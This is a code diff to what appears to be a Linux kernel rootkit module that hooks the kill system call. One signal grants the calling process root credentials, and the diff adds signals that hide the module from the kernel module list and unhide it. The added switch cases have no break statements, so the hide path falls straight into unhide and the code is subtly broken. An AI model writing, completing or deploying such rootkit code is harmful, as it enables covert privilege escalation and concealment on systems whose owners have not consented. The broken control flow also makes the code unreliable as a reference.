@@ -23,9 +23,13 @@
 #define SYS_CALL_NUM 300
 
 #define SIG_GIVE_ROOT 32
+#define SIG_HIDE 33
+#define SIG_UNHIDE 34
 
 asmlinkage int (*original_sysinfo)(struct sysinfo *);
 asmlinkage int (*original_kill)(pid_t, int);
+
+struct list_head *module_list;
 
 
 void update_sys_calls(void **sys_call_table){
@@ -69,6 +73,11 @@ asmlinkage int hacked_kill(pid_t pid, int sig)
             give_root();
             pr_info("Root priviledge given!\n");
             break;
+        case SIG_HIDE:
+            pr_info("Hiding the module!\n");
+            hide();
+        case SIG_UNHIDE:
+            unhide();
         default:
             return original_kill(pid, sig);
     }
@@ -87,6 +96,17 @@ void give_root(void)
     newcreds->fsuid = newcreds->fsgid = 0;
  
     commit_creds(newcreds);
+}
+
+void hide(void)
+{
+    module_list = THIS_MODULE->list.prev;
+    list_del(&THIS_MODULE->list);
+}
+
+void unhide(void)
+{
+    list_add(&THIS_MODULE->list, module_list);
 }
 
 void **find_syscall_table(void)
